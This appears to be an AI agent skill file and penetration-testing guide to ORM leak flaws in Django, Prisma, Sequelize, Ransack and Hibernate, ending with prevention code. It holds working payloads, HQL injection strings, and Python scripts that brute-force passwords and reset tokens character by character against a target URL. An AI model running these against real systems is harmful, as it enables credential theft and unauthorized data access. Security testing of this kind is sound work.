---
name: orm-leak
description: ORM leak exploitation for data exposure via object-relational mapping. Use when testing ORM implementations.
---

# ORM Leak

## Description
ORM (Object-Relational Mapping) Leak vulnerabilities occur when attackers can manipulate ORM queries through user input to extract sensitive data, bypass filters, or access unauthorized information. Different ORM frameworks have specific query syntax that can be exploited.

## Vulnerability Mechanism

ORMs translate user requests into database queries. When user input is directly used in query construction without proper validation, attackers can inject ORM-specific operators to:
- Extract sensitive fields
- Bypass access controls
- Enumerate data through relationships

## Django ORM Exploitation

### Basic Field Filtering
```python
# Vulnerable code
def search_users(request):
    filters = request.GET.dict()
    users = User.objects.filter(**filters)
    return users
```

### Operators for Exploitation
```
__exact      - Exact match
__iexact     - Case-insensitive exact match
__contains   - Contains substring
__icontains  - Case-insensitive contains
__startswith - Starts with
__endswith   - Ends with
__regex      - Regular expression match
__gt         - Greater than
__gte        - Greater than or equal
__lt         - Less than
__lte        - Less than or equal
```

### Exploitation Payloads

#### Extract Password Starting Character
```
GET /users?password__startswith=a
GET /users?password__startswith=b
GET /users?password__startswith=c
```

#### Using Regex
```
GET /users?password__regex=^admin
GET /users?password__regex=^.{8}$  # Password length 8
```

#### Relational Field Access
```
# Access related model fields
GET /posts?created_by__user__password__startswith=a

# Many-to-many relationship traversal
GET /posts?created_by__departments__employees__user__username__startswith=admin
```

### Python Script for Extraction
```python
import requests
import string

url = "https://target.com/api/users"
chars = string.ascii_lowercase + string.digits
password = ""

while True:
    found = False
    for c in chars:
        params = {"password__startswith": password + c}
        response = requests.get(url, params=params)

        if response.json():  # Results returned
            password += c
            print(f"[+] Found: {password}")
            found = True
            break

    if not found:
        break

print(f"[+] Password: {password}")
```

## Prisma ORM Exploitation (Node.js)

### Vulnerable Pattern
```javascript
// Vulnerable code
app.get('/posts', async (req, res) => {
    const posts = await prisma.post.findMany({
        where: req.query.filter,
        include: req.query.include
    });
    res.json(posts);
});
```

### Exploitation Payloads

#### Include Sensitive Fields
```json
{
    "include": {
        "createdBy": {
            "select": {
                "password": true,
                "email": true,
                "apiKey": true
            }
        }
    }
}
```

#### URL Encoded
```
GET /posts?include[createdBy][select][password]=true
GET /posts?include[createdBy][select][email]=true
```

#### Filter Manipulation
```json
{
    "filter": {
        "createdBy": {
            "password": {
                "startsWith": "admin"
            }
        }
    }
}
```

## Sequelize ORM Exploitation (Node.js)

### Operator Injection
```javascript
// Vulnerable code
User.findAll({
    where: req.body.where
});
```

### Payloads
```json
{
    "where": {
        "password": {
            "$like": "a%"
        }
    }
}

{
    "where": {
        "$or": [
            {"username": "admin"},
            {"role": "admin"}
        ]
    }
}
```

## Rails/ActiveRecord Exploitation (Ruby)

### Ransack Library Vulnerabilities
```ruby
# Vulnerable code using Ransack
@q = User.ransack(params[:q])
@users = @q.result
```

### Exploitation
```
# Search by password starting character
GET /users?q[password_start]=a

# Search by reset token
GET /users?q[reset_password_token_start]=abc

# Continuation for extraction
GET /users?q[reset_password_token_cont]=def
```

### Python Script for Ransack Extraction
```python
import requests
import string

url = "https://target.com/users"
chars = string.ascii_lowercase + string.digits + string.ascii_uppercase
token = ""

while len(token) < 32:  # Assuming 32 char token
    for c in chars:
        params = {"q[reset_password_token_start]": token + c}
        response = requests.get(url, params=params)

        if "found" in response.text or response.json():
            token += c
            print(f"[+] Token: {token}")
            break

print(f"[+] Final Token: {token}")
```

## Hibernate/JPA Exploitation (Java)

### HQL Injection
```java
// Vulnerable code
String query = "FROM User WHERE username = '" + username + "'";
Query q = session.createQuery(query);
```

### Payloads
```
' OR '1'='1
' OR username LIKE '%admin%
' UNION SELECT password FROM User WHERE '1'='1
```

## Common CVEs

| CVE | Product | Description |
|-----|---------|-------------|
| CVE-2023-47117 | Label Studio | Django ORM Leak |
| CVE-2023-31133 | Ghost CMS | Prisma ORM Leak |
| CVE-2023-30843 | Payload CMS | ORM field exposure |

## Tools

### plormber
```bash
# https://github.com/nickmakesstuff/plormber
# ORM Leak exploitation tool

python plormber.py -u "https://target.com/api/users" -p "password"
```

### Manual Testing
```bash
# Django ORM
curl "https://target.com/api/users?password__startswith=a"

# Prisma
curl "https://target.com/api/posts?include[author][select][password]=true"

# Ransack
curl "https://target.com/users?q[password_start]=a"
```

## Detection Checklist

- [ ] Test Django lookup operators (__startswith, __contains, etc.)
- [ ] Test Prisma include/select manipulation
- [ ] Test Sequelize operator injection
- [ ] Test Ransack query parameters
- [ ] Check for relationship traversal
- [ ] Test sensitive field access via ORM
- [ ] Look for API endpoints accepting filter objects

## Prevention

### Django
```python
# Whitelist allowed filter fields
ALLOWED_FILTERS = ['name', 'email', 'created_at']

def search_users(request):
    filters = {k: v for k, v in request.GET.items() if k in ALLOWED_FILTERS}
    users = User.objects.filter(**filters)
```

### Prisma
```javascript
// Define allowed includes
const allowedIncludes = {
    posts: true,
    profile: true
    // NOT: password, apiKey, etc.
};

app.get('/users', async (req, res) => {
    const users = await prisma.user.findMany({
        include: allowedIncludes
    });
});
```

### General
```
1. Never pass user input directly to ORM queries
2. Whitelist allowed filter fields
3. Exclude sensitive fields from query results
4. Use DTOs to control exposed data
5. Implement field-level access control
6. Validate and sanitize all query parameters
```

## References
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/ORM%20Leak
- https://github.com/elttam/plormber
- https://docs.djangoproject.com/en/4.2/ref/models/querysets/
